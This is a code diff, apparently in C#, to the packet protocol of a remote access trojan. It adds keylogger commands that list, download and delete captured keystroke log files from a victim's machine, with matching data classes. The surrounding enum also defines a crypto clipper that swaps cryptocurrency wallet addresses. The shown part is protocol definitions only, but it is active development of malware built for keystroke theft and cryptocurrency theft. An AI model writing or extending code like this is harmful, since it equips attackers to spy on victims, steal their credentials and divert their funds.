@@ -93,11 +93,16 @@ public enum PacketType
     FunResult = 161,  // client→server: {Action, Result}
 
     // Keylogger
-    KeyloggerStart     = 170,  // server→client: start capturing keys
-    KeyloggerStop      = 171,  // server→client: stop capturing keys
-    KeyloggerGetLogs   = 172,  // server→client: request buffered logs
-    KeyloggerLogsResult = 173, // client→server: {Logs, IsRunning}
-    KeyloggerClear     = 174,  // server→client: clear log buffer on client
+    KeyloggerStart       = 170,  // server→client: start capturing keys
+    KeyloggerStop        = 171,  // server→client: stop capturing keys
+    KeyloggerGetLogs     = 172,  // server→client: request in-memory buffer
+    KeyloggerLogsResult  = 173,  // client→server: {Logs, IsRunning}
+    KeyloggerClear       = 174,  // server→client: clear log buffer
+    KeyloggerListFiles   = 175,  // server→client: list log files on disk
+    KeyloggerFilesResult = 176,  // client→server: [{Filename, Size}]
+    KeyloggerGetFile     = 177,  // server→client: {Filename}
+    KeyloggerFileContent = 178,  // client→server: {Filename, Content}
+    KeyloggerDeleteFile  = 179,  // server→client: {Filename}
 
     // Crypto Clipper
     ClipperSetConfig   = 180,  // server→client: {Enabled, Addresses:{BTC,ETH,...}}
@@ -342,6 +347,18 @@ public class KeyloggerLogsResultData
     public string Logs      { get; set; } = string.Empty;
     public bool   IsRunning { get; set; }
 }
+public class KeyloggerFileEntry
+{
+    public string Filename { get; set; } = string.Empty;
+    public long   Size     { get; set; }
+}
+public class KeyloggerFilesResultData
+{
+    public List<KeyloggerFileEntry> Files     { get; set; } = [];
+    public bool                     IsRunning { get; set; }
+}
+public class KeyloggerGetFileData     { public string Filename { get; set; } = string.Empty; }
+public class KeyloggerFileContentData { public string Filename { get; set; } = string.Empty; public string Content { get; set; } = string.Empty; }
 
 // ── Crypto Clipper ────────────────────────────────────
 public class ClipperAddresses
